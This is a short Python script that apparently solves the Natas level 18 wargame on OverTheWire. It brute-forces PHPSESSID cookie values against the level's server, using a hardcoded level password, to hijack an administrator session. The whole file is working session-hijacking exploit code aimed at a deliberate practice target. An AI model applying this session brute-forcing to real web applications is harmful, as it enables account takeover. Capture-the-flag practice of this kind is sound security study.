import requests
import string
import base64
import itertools

def find_password():
    auth_key = "Basic " + base64.b64encode(b"natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP").decode("utf-8")
    for sess_id in range(1, 640):
        result = requests.post("http://natas18.natas.labs.overthewire.org", 
                headers={"Authorization": auth_key, "Cookie": "PHPSESSID=" + str(sess_id)}, 
                data={"username": "abc", "password": "abc"})
        if "Username:" in result.text:
            return str(sess_id) + " " + result.text

print(find_password())
